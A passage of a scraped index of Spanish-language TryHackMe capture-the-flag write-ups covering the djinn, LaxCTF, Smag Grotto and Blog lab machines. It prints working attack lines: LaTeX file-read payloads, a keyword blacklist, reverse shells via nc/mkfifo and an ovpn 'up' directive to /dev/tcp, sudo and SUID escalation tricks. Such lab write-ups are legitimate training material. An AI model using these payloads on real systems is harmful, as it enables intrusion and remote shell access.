10.2.29.162\u0026#34; wish /usr/bin/genie -p bash -g -e \u0026#34;ping -c 5 10.2.29.162\u0026#34; wish We\u0026#39;ve added your wish to our records. Continue praying!!   En la documentacion de este ejecutable encontramos un parametro que no aparece en el ejecutable al mostrar la ayuda (-h), agregamos este parametro junto al usuario sam. Logramos obtener una shell con este ultimo usuario.\n1 2 3 4  nitish@djinn:~$ sudo -u sam /usr/bin/genie -cmd gg my man!! $ whoami sam   PRIVILEGE ESCALATION Hicimos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando lago.\n1 2 3 4 5 6 7 8 9 10 11 12  $ sudo -l -l Matching Defaults entries for sam on djinn: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User sam may run the following commands on djinn: Sudoers entry: RunAsUsers: root Options: !authenticate Commands: /root/lago $   Ejecutamos este comando y nos muestra diferentes opciones pero ninguna de estas nos deja escalar privilegios. En la carpeta de este usuario encontramos un archivo .pyc el cual al leer las strings encontramos las mismas que el comando lago muestra.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  $ strings .pyc getuser( system( randintc Working on it!! ( /home/mzfr/scripts/exp.pyt naughtyboi Choose a number between 1 to 100: s Enter your number: s /bin/shs Better Luck next time( inputR numt /home/mzfr/scripts/exp.pyt [... REDACTED ...]   Copiamos este archivo a nuestra maquina y utilizamos uncompyle6. Vemos en el codigo fuente, especificamente en la fucnion guessit() vemos que hace una comparacion de la variable s con num, en el input no realiza ninguna validacion de si lo ingresado es un entero o string, en esta funcion al adivinar el numero devuelve una shell con usuario root. Para poder aprovecharnos de este script vamos a ingresar el nombre de la variable num ya que la variable s no tiene ningun tipo de validacion.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  # uncompyle6 version 3.7.3 # Python bytecode 2.7 (62211) # Decompiled from: Python 3.8.2 (default, Apr 1 2020, 15:52:55) # [GCC 9.3.0] # Embedded file name: /home/mzfr/scripts/exp.py # Compiled at: 2019-11-07 07:05:18 from getpass import getuser from os import system from random import randint def naughtyboi(): print \u0026#39;Working on it!!\u0026#39; def guessit(): num = randint(1, 101) print \u0026#39;Choose a number between 1 to 100: \u0026#39; s = input(\u0026#39;Enter your number: \u0026#39;) if s == num: system(\u0026#39;/bin/sh\u0026#39;) else: print \u0026#39;Better Luck next time\u0026#39; [... REDACTED ...] if __name__ == \u0026#39;__main__\u0026#39;: main(options()) # okay decompiling file_pyc.pyc   Logramos obtener nuestra shell con usuario root y flag user.txt.\n","description":"djinn es una maquina de TryHackMe, ejecutamos una shell inversa en una ruta de la aplicacion web, en el codigo fuente encontramos la ruta de un archivo con credenciales que nos permitio acutalizar nuestra shell al siguiente usuario que además obtuvimos acceso por SSH realizando Port Knocking. Para el movimiento lateral ejecutamos genie con parametros para una shell. Escalamos privilegios analizando el codigo fuente de un script en Python el cual no tenia validaciones en las variables lo que nos permitía ejecutar /bin/sh.","id":61,"section":"posts","tags":["ftp","knockd","port knocking","python","uncompyle6"],"title":"TryHackMe - djinn","uri":"https://sckull.github.io/posts/djinn/"},{"content":"  LaxCTF es una maquina de TryHackMe, descubrimos LaTex con una vulnerabilidad lo que nos permitio leer un fichero cifrado, y, con el analisis de codigo fuente a un APK obtuvimos credenciales para SSH. Escalamos privilegios mediante un CronJob y un archivo ovpn.\nRoom    Titulo LaxCTF      Descripción Try Harder!   Puntos *   Dificultad Media   Maker stuxnet     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11  # Nmap 7.80 scan initiated Wed Jul 29 19:15:28 2020 as: nmap -sV -o nmap_scan_mini lax.thm Nmap scan report for lax.thm (10.10.90.68) Host is up (0.27s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Jul 29 19:16:41 2020 -- 1 IP address (1 host up) scanned in 72.59 seconds   HTTP Encontramos una pagina web en el puerto 80.\nRUSTBUSTER Utilizamos rustbuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41  root@upset:~/thm/lax# /opt/rustbuster/rustbuster dir -e php,html,txt -t 250 -u http://lax.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt ~ rustbuster v3.0.3 ~ by phra \u0026amp; ps1dr3x ~tarted at\t: 2020-07-29 20:57:11 GET\t200 OK\thttp://lax.thm/ GET 403 Forbidden http://lax.thm/.html GET 403 Forbidden http://lax.thm/.php GET 200 OK http://lax.thm/index.php GET 301 Moved Permanently http://lax.thm/pdf =\u0026gt; http://lax.thm/pdf/ GET 301 Moved Permanently http://lax.thm/templates =\u0026gt; http://lax.thm/templates/ GET 301 Moved Permanently http://lax.thm/assets =\u0026gt; http://lax.thm/assets/ GET 200 OK http://lax.thm/ajax.php GET 301 Moved Permanently http://lax.thm/javascript =\u0026gt; http://lax.thm/javascript/ GET 200 OK http://lax.thm/config.php GET 200 OK http://lax.thm/flag.php GET 301 Moved Permanently http://lax.thm/compile =\u0026gt; http://lax.thm/compile/ GET 301 Moved Permanently http://lax.thm/Google-Earth =\u0026gt; http://lax.thm/Google-Earth/ GET 200 OK http://lax.thm/ GET 403 Forbidden http://lax.thm/.php GET 403 Forbidden http://lax.thm/.html C^   LaTeX - EXPLOIT En la pagina encontramos pdfTeX para generar PDF a partir de un template y texto ingresado, ingresamos un texto cualquiera y nos devuelve la direccion en donde se encuentra el PDF. Además la version de pdfTeX Version 3.14159265-2.6-1.40.16\nEn la direccion, el PDF con el texto ingresado.\nCon el siguiente \u0026ldquo;payload\u0026rdquo; logramos obtener la primera linea del archivo /etc/passwd\n1 2 3 4 5  \\newread\\file \\openin\\file=/etc/passwd \\read\\file to\\line \\text{\\line} \\closein\\file   Intentamos utilizar el mismo payload que utilizamos en CHAOS - HTB pero al parecer tiene un blacklist parecido a este:\n1  \u0026#34;(input|include|write18|immediate)\u0026#34;   Por lo que no es posible utilizar los \u0026ldquo;comandos\u0026rdquo; conocidos. Probamos diferentes combinaciones pero ninguna de estas combinaciones funcionó. Reallizamos una busqueda de un posible exploit en google y encontramos un PoC en Moodle \u0026lt; 1.6.9/1.7.7/1.8.9/1.9.5 - File Disclosure donde indica como es posible leer archivos a traves del siguiente payload:\n1  \u0026#34;$$\\input{/etc/passwd} $$\u0026#34;   Logramos leer el archivo e incrustarlo en el PDF:\nAdemás, dentro de la respuesta al enviar el PoC encontramos el contenido del archivo /etc/passwd con la informacion desordenada, donde logramos ver uno de los usuarios con su directorio principal y una carpeta no muy comun dentro de este archivo. Uno de los usuarios es Lax o king (Lax puede referirse al hostname) y su carpeta principal se encuentra en /home/king, el otro directorio es /opt/secret.\nUtilizando el directorio principal del usuario que encontramos podemos leer nuestra flag user.txt.\n1  \u0026#34;$$\\input{/home/king/user.txt} $$\u0026#34;   Hicimos lo mismo con /opt/secret pero a un principio no tenia nada en su interior, pero al inspeccionar el codigo fuente encontramos strings separadas por etiquetas HTML.\nUtilizamos HTML-strip para poder eliminar las etiquetas y obtener el texto completo, además eliminamos todos los espacios existentes y caracteres al inicio y al final \u0026quot; y 1. Logramos leer lo que parece una encriptacion AES en modo CBC pero para obtener el texto necesitamos KEY e IV.\n1 2 3  AES/CBC/128d2X+7fLZAq4as9qs7yGRdWANgbFVDaly2j2TjnKbeCq8bH3iR2XpyXBVjSCsrGLmTAhyffVoOgbhmVl5vDDMNvC6wJNfEZWa+MkF8HGQBcrE9pYSHag8jxC4vFwyINMOq53YR2GXUZFvA/qipjUStx3N69Wc7f3QpDVKRmGudEPhw0AMnnbICAvCNPoXIdyOK3I2zKM+za8z7+7V6Ut5gWCKQezKa+l91GNQWj1iUKU0rlzTmr49Fkcwlw01E0tr3DqQv8BV0V3eCs7mRnUCzdW4tnRH9J9eP7likT [... REDACTED ...] g9bmi7WpLL/+UMWNYMetCj52lDgLyisn9B+0/W0/Tfd7qn5SLILAVrMICIYIfVWWsELCTIYTuLEpdo+HVAfxfh8RB3pZ3cG+uzCe1xSMcx0JfSld1Hfa3hJK75zVWwcfu4EvVZ1ghlZwtm7Ls=   KING - USER APK Encontramos un apk en /Google-Earth/ y utilizamos jadx para leer el codigo fuente de la aplicacion, en donde encontramos funciones para encriptar y desencriptar, además encontramos el IV y KEY.\nUtilizamos CyberChef para desencriptar el texto (eliminamos AES/CBC/128).\nEl texto esta codificado en brainfuck, utilizamos dcode.fr\nNuevamente utilizamos CyberChef para obtener lo que parecen credenciales del usuario king.\nLogramos obtener una shell con el usuario King.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con pspy y encontramos que se ejecuta un cron, el problema es de que no sabemos cual es el contenido de dicho archivo (run.sh).\nEn el directorio principal de king encontramos un archivo ovpn por lo que agregamos una shell inversa al igual que en VAULT - HTB esperando a alguna conexion a nuestra maquina.\n1 2 3 4 5  remote 10.10.90.68 dev tun nobind script-security 2 up \u0026#34;/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.1/1338 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;   Logramos obtener una shell con usuario root y nuestra flag root.txt.\nRevisamos el archivo run.sh y es el que ejecutó el archivo ovpn.\n1  openvpn /home/king/tryhackme.ovpn   Payloads - Latex Injection\n","description":"LaxCTF es una maquina de TryHackMe, descubrimos LaTex con una vulnerabilidad lo que nos permitio leer un fichero cifrado, y, con el analisis de codigo fuente a un APK obtuvimos credenciales para SSH. Escalamos privilegios mediante un CronJob y un archivo ovpn.","id":62,"section":"posts","tags":["laTex","jadx","brainfuck","cron","openvpn"],"title":"TryHackMe - LaxCTF","uri":"https://sckull.github.io/posts/laxctf/"},{"content":"  Smag Grotto es una maquina de TryHackMe, analizamos un archivo PCAP donde encontramos credenciales para ingresar en la plataforma y ejecutar una shell inversa. Cambiamos al siguiente usuario tomando ventaja de un CronJob. Escalamos privilegios utilizando APT.\nRoom    Titulo Smag Grotto      Descripción Follow the yellow brick road.   Puntos 160   Dificultad Facil   Maker jakeyee     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto smb (445), ldap (139) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11  # Nmap 7.80 scan initiated Wed Jul 29 17:29:14 2020 as: nmap -sV -o nmap_scan_mini smag.thm Nmap scan report for smag.thm (10.10.138.62) Host is up (0.26s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Jul 29 17:29:58 2020 -- 1 IP address (1 host up) scanned in 44.14 seconds   HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3  root@upset:~/thm/smag# gobuster dir -u http://smag.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t 25 -x php,html,txt /index.php (Status: 200) /mail (Status: 301)   WWW-DATA - USER Encontramos la pagina /mail donde vemos algunos correos, en uno de ellos un archivo pcap.\nAnalizamos el archivo y encontramos credenciales, además de ello un subdominio.\n1 2 3 4 5 6 7 8 9 10 11 12  POST /login.php HTTP/1.1 Host: development.smag.thm User-Agent: curl/7.47.0 Accept: */* Content-Length: 39 Content-Type: application/x-www-form-urlencoded username=help[... REDACTED ...]\u0026amp;password=cH4nG3M3_[... REDACTED ...]HTTP/1.1 200 OK Date: Wed, 03 Jun 2020 18:04:07 GMT Server: Apache/2.4.18 (Ubuntu) Content-Length: 0 Content-Type: text/html; charset=UTF-8   Agregamos el subdominio en nuestro archivo /etc/hosts. Visitamos el puerto 80 y encontramos archivos css y php.\nUtilizamos las credenciales en el panel de login.php donde logramos obtener acceso a una pagina para ingresar comandos.\nEnviamos un ping hacia nuestra maquina y logramos obtener paquetes desde la maquina (smag.thm).\nEjecutamos la siguiente shell inversa con nuestra IP y PUERTO para obtener una shell con el usuario www-data.\n1  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.0.0.0 1338 \u0026gt;/tmp/f   USER - JAKE Dentro de la maquina, enumeramos los directorios, en /opt/ encontramos un directorio con un archivo que contiene la clave publica (id_rsa.pub) del usuario jake.\nRevisamos los crons de la maquina y encontramos que el contenido de este ultimo archivo se agrega al archivo authorized_keys del usuario jake, por lo que podemos agregar nuestra clave publica al archivo /opt/.backups/jake_id_rsa.pub.backup para poder ingresar en el servicio SSH utilizando el usuario Jake.\nAuthorized_Keys - SSH\nAgregamos nuestra clave publica y esperamos hasta que se agregue en el archivo de Jake.\nIngresamos con el usuario Jake en SSH sin ninguna contraseña, y logramos obtener una shell y nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando apt-get. Utilizamos apt-get para obtener una shell root y nuestra flag root.txt.\n","description":"Smag Grotto es una maquina de TryHackMe, analizamos un archivo PCAP donde encontramos credenciales para ingresar en la plataforma y ejecutar una shell inversa. Cambiamos al siguiente usuario tomando ventaja de un CronJob. Escalamos privilegios utilizando APT.","id":63,"section":"posts","tags":[],"title":"TryHackMe - Smag Grotto","uri":"https://sckull.github.io/posts/smag/"},{"content":"  Blog es una maquina de TryHackMe, presenta retos de esteganografia, ataque de contraseñas y una vulnerabilidad en WordPress para obtener acceso. Con el codigo fuente de una fichero SUID exportamos una variable de entorno que nos devolvio una shell como root.\nRoom    Titulo Blog      Descripción Billy Joel made a Wordpress blog!   Puntos 350   Dificultad Media   Maker Nameless0ne     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto smb (445), http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13  # Nmap 7.80 scan initiated Thu Jul 23 16:31:53 2020 as: nmap -sV -o nmap_scan_mini blog.thm Nmap scan report for blog.thm (10.10.91.166) Host is up (0.26s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Jul 23 16:32:56 2020 -- 1 IP address (1 host up) scanned in 63.00 seconds   SAMBA Utilizamos smbclient para enumerar los SHARENAMES, encontramos BillySMB en el cual logramos descargar algunos archivos multimedia.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  root@upset:~/thm/blog# smbclient -L blog.thm Enter WORKGROUP\\root\u0026#39;s password: Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers BillySMB Disk Billy\u0026#39;s local SMB Share IPC$ IPC IPC Service (blog server (Samba, Ubuntu)) SMB1 disabled -- no workgroup available root@upset:~/thm/blog# smbclient \\\\\\\\blog.thm\\\\BillySMB Enter WORKGROUP\\root\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Tue May 26 13:17:05 2020 .. D 0 Tue May 26 12:58:23 2020 Alice-White-Rabbit.jpg N 33378 Tue May 26 13:17:01 2020 tswift.mp4 N 1236733 Tue May 26 13:13:45 2020 check-this.png N 3082 Tue May 26 13:13:43 2020 15413192 blocks of size 1024. 9788768 blocks available smb: \\\u0026gt; get Alice-White-Rabbit.jpg getting file \\Alice-White-Rabbit.jpg of size 33378 as Alice-White-Rabbit.jpg (18.8 KiloBytes/sec) (average 18.8 KiloBytes/sec) smb: \\\u0026gt; get check-this.png getting file \\check-this.png of size 3082 as check-this.png (2.5 KiloBytes/sec) (average 12.2 KiloBytes/sec) smb: \\\u0026gt; get tswift.mp4 getting file \\tswift.mp4 of size 1236733 as tswift.mp4 (110.8 KiloBytes/sec) (average 89.9 KiloBytes/sec) smb: \\\u0026gt;   Archivos encontrados:\nUtilizamos steghide en el archivo JPG para verificar si tenian archivos ocultos, pero solo fuimos trolleados.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  root@upset:~/thm/blog# steghide Alice-White-Rabbit.jpg steghide: unknown command \u0026#34;Alice-White-Rabbit.jpg\u0026#34;. steghide: type \u0026#34;steghide --help\u0026#34; for help. root@upset:~/thm/blog# steghide info Alice-White-Rabbit.jpg \u0026#34;Alice-White-Rabbit.jpg\u0026#34;: format: jpeg capacity: 1.8 KB Try to get information about embedded data ? (y/n) y Enter passphrase: embedded file \u0026#34;rabbit_hole.txt\u0026#34;: size: 48.0 Byte encrypted: rijndael-128, cbc compressed: yes root@upset:~/thm/blog# steghide extract -sf Alice-White-Rabbit.jpg Enter passphrase: wrote extracted data to \u0026#34;rabbit_hole.txt\u0026#34;. root@upset:~/thm/blog# cat rabbit_hole.txt You\u0026#39;ve found yourself in a rabbit hole, friend.   El archivo QR al escanearlo nos devuelve una URL, esta url nos redirige a un video de youtube.\nHTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos, vemos que tiene directorios que pertenecen a Wordpress.\nroot@upset:~/thm/blog# gobuster dir -u http://blog.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t 25 -x php,html,txt /rss (Status: 301) /index.php (Status: 301) /login (Status: 302) /0 (Status: 301) /feed (Status: 301) /atom (Status: 301) /wp-content (Status: 301) /admin (Status: 302) /welcome (Status: 301) /wp-login.php (Status: 200) /n (Status: 301) /w (Status: 301) /rss2 (Status: 301) /license.txt (Status: 200) /wp-includes (Status: 301) /readme.html (Status: 200) /wp-register.php (Status: 301) /no (Status: 301) /wp-rss2.php (Status: 301) /rdf (Status: 301) /page1 (Status: 301) /robots.txt (Status: 200) /' (Status: 301) /dashboard (Status: 302) /note (Status: 301) /%20 (Status: 301) WPSCAN Utilizamos wpscan para enumerar version, usuarios, plugins y temas vulnerables de Wordpress. Encontramos dos usuarios registrados.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106  [+] URL: http://blog.thm/ [+] Started: Thu Jul 23 16:52:47 2020 Interesting Finding(s): [+] http://blog.thm/ | Interesting Entry: Server: Apache/2.4.29 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] http://blog.thm/robots.txt | Interesting Entries: | - /wp-admin/ | - /wp-admin/admin-ajax.php | Found By: Robots Txt (Aggressive Detection) | Confidence: 100% [+] http://blog.thm/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access [+] http://blog.thm/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] Upload directory has listing enabled: http://blog.thm/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] http://blog.thm/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 5.0 identified (Insecure, released on 2018-12-06). | Found By: Rss Generator (Passive Detection) | - http://blog.thm/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.0\u0026lt;/generator\u0026gt; | - http://blog.thm/comments/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.0\u0026lt;/generator\u0026gt; [+] WordPress theme in use: twentytwenty | Location: http://blog.thm/wp-content/themes/twentytwenty/ | Last Updated: 2020-06-10T00:00:00.000Z | Readme: http://blog.thm/wp-content/themes/twentytwenty/readme.txt | [!] The version is out of date, the latest version is 1.4 | Style URL: http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3 | Style Name: Twenty Twenty | Style URI: https://wordpress.org/themes/twentytwenty/ | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | Confirmed By: Css Style In 404 Page (Passive Detection) | | Version: 1.3 (80% confidence) | Found By: Style (Passive Detection) | - http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3, Match: \u0026#39;Version: 1.3\u0026#39; [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:06 \u0026lt;====================================================================================================================================\u0026gt; (10 / 10) 100.00% Time: 00:00:06 [i] User(s) Identified: [+] kwheel | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http://blog.thm/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] bjoel | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http://blog.thm/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] Karen Wheeler | Found By: Rss Generator (Passive Detection) | Confirmed By: Rss Generator (Aggressive Detection) [+] Billy Joel | Found By: Rss Generator (Passive Detection) | Confirmed By: Rss Generator (Aggressive Detection) [!] No WPVulnDB API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up. [+] Finished: Thu Jul 23 16:53:07 2020 [+] Requests Done: 24 [+] Cached Requests: 35 [+] Data Sent: 6.06 KB [+] Data Received: 154.571 KB [+] Memory used: 117.724 MB [+] Elapsed time: 00:00:19   Utilizamos wpscan para hacer un ataque de fuerza bruta con los usuarios que encontramos, primero intentamos con el usuario kwheel al que logramos encontrar la contraseña.\nWWW-DATA - USER Con las credenciales que encontramos, editamos el archivo, pero no podemos realizar alguna modificacion a los archivos.\nBuscamos exploits/vulnerabilidades de la version de wordpress y vemos un exploit para metasploit que afecta esta version.\n1 2 3 4 5 6 7 8 9 10  root@upset:~/thm/blog# searchsploit wordpress 5.0 ---------------------------------------------------------------------------------------------------------------- ---------------------------------------- Exploit Title | Path | (/usr/share/exploitdb/) ---------------------------------------------------------------------------------------------------------------- ---------------------------------------- WordPress 5.0.0 - Crop-image Shell Upload (Metasploit) | exploits/php/remote/46662.rb [ ... REDACTED ...] ---------------------------------------------------------------------------------------------------------------- ---------------------------------------- Shellcodes: No Result   Utilizamos metasploit con el exploit que encontramos y logramos obtener una shell en la maquina con el usuario www-data.\nEn el directorio /home/bjoel encontramos la \u0026ldquo;flag user.txt\u0026rdquo; pero no contiene lo que buscamos, además encontramos un pdf que tiene informacion sobre Rubber Ducky.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  www-data@blog:/home/bjoel$ ls -lah total 100K drwxr-xr-x 4 bjoel bjoel 4.0K May 26 20:08 . drwxr-xr-x 3 root root 4.0K May 26 18:02 .. lrwxrwxrwx 1 root root 9 May 26 18:18 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 bjoel bjoel 220 Apr 4 2018 .bash_logout -rw-r--r-- 1 bjoel bjoel 3.7K Apr 4 2018 .bashrc drwx------ 2 bjoel bjoel 4.0K May 25 13:15 .cache drwx------ 3 bjoel bjoel 4.0K May 25 13:15 .gnupg -rw-r--r-- 1 bjoel bjoel 807 Apr 4 2018 .profile -rw-r--r-- 1 bjoel bjoel 0 May 25 13:16 .sudo_as_admin_successful -rw-r--r-- 1 bjoel bjoel 68K May 26 18:33 Billy_Joel_Termination_May20-2020.pdf -rw-r--r-- 1 bjoel bjoel 57 May 26 20:08 user.txt www-data@blog:/home/bjoel$ cat user.txt cat user.txt You won\u0026#39;t find what you\u0026#39;re looking for here. TRY HARDER www-data@blog:/home/bjoel$   Billy_Joel_Termination_May20-2020.pdf\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion en la maquina por binarios/archivos SUID, encontramos un archivo ejecutable, al ejecutarlo nos muestra un mensaje de Not an Admin.\n1 2 3 4 5 6 7  ind / -perm -4000 2\u0026gt; /dev/null | xargs ls -lah [... REDACTED ...] -rwsr-xr-x 1 root root 99K Nov 23 2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic -rwsr-sr-x 1 root root 8.3K May 26 18:27 /usr/sbin/checker file /usr/sbin/checker /usr/sbin/checker: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6cdb17533a6e02b838336bfe9791b5d57e1e2eea, not stripped   Revisamos los strings del ejecutable y encontramos algunos strings interesantes, como /bin/bash, setuid, puts, getenv, system.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  /lib64/ld-linux-x86-64.so.2 libc.so.6 setuid puts getenv system [... REDACTED ...] admin /bin/bash Not an Admin ;*3$\u0026#34; GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0 crtstuff.c deregister_tm_clones [... REDACTED ...]   Utilizamos Ghidra para analizar el archivo, vemos la funcion main, donde tiene una variable que obtiene (getenv()) la variable admin, en el caso de que esta variable este vacia se cierra el programa, en otro caso retorna una shell con usuario root.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  undefined8 main(void) { char *pcVar1; pcVar1 = getenv(\u0026#34;admin\u0026#34;); if (pcVar1 == (char *)0x0) { puts(\u0026#34;Not an Admin\u0026#34;); } else { setuid(0); system(\u0026#34;/bin/bash\u0026#34;); } return 0; }   En la maquina creamos la variable $admin a quien le pasamos un directorio cualquiera, ejecutamos el ejecutable y logramos obtener una shell con usuario root y la flag root.txt.\nFinalmente, buscamos la flag user.txt.\nANEXO - DATABASE BLOG Logramos entrar al servicio de mysql sin credenciales utilizando el usuario root, donde encontramos las credenciales de los usuarios de la base de datos de wordpress (blog).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55  +--------------------+ | Database | +--------------------+ | information_schema | | blog | | mysql | | performance_schema | | sys | +--------------------+ 5 rows in set (0.00 sec) +-----------------------+ | Tables_in_blog | +-----------------------+ | wp_commentmeta | | wp_comments | | wp_links | | wp_options | | wp_postmeta | | wp_posts | | wp_term_relationships | | wp_term_taxonomy | | wp_termmeta | | wp_terms | | wp_usermeta | | wp_users | +-----------------------+ 12 rows in set (0.00 sec) mysql\u0026gt; describe wp_users; +---------------------+---------------------+------+-----+---------------------+----------------+ | Field | Type | Null | Key | Default | Extra | +---------------------+---------------------+------+-----+---------------------+----------------+ | ID | bigint(20) unsigned | NO | PRI | NULL | auto_increment | | user_login | varchar(60) | NO | MUL | | | | user_pass | varchar(255) | NO | | | | | user_nicename | varchar(50) | NO | MUL | | | | user_email | varchar(100) | NO | MUL | | | | user_url | varchar(100) | NO | | | | | user_registered | datetime | NO | | 0000-00-00 00:00:00 | | | user_activation_key | varchar(255) | NO | | | | | user_status | int(11) | NO | | 0 | | | display_name | varchar(250) | NO | | | | +---------------------+---------------------+------+-----+---------------------+----------------+ 10 rows in set (0.00 sec) mysql\u0026gt; select * from wp_users; +----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+ | ID | user_login | user_pass | user_nicename | user_email | user_url | user_registered | user_activation_key | user_status | display_name | +----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+ | 1 | bjoel | $P$BjoFHe8zIyjnQe/CBvaltzzC6ckPcO/ | bjoel | nconkl1@outlook.com | | 2020-05-26 03:52:26 | | 0 | Billy Joel | | 3 | kwheel | $P$BedNwvQ29vr1TPd80CDl6WnHyjr8te. | kwheel | zlbiydwrtfjhmuuymk@ttirv.net | | 2020-05-26 03:57:39 | | 0 | Karen Wheeler | +----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+ 2 rows in set (0.00 sec)   ","description":"Blog es una maquina de TryHackMe, presenta retos de esteganografia, ataque de contraseñas y una vulnerabilidad en WordPress para obtener acceso. Con el codigo fuente de una fichero SUID exportamos una variable de 